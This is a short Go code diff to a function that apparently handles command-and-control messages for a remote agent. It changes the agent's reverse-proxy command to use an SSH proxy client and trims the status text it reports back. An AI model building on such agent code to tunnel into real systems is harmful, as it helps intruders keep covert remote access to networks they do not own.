@@ -155,9 +155,9 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 			addr := cmdSlice[1]
-			out = "Reverse proxy for " + addr + " finished without errors"
+			out = "Reverse proxy for " + addr + " finished"
 			ctx, cancel := context.WithCancel(context.Background())
-			if err = StartReverseProxy(addr, ctx, cancel); err != nil {
+			if err = SSHProxyClient(addr, ctx, cancel); err != nil {
 				out = err.Error()
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
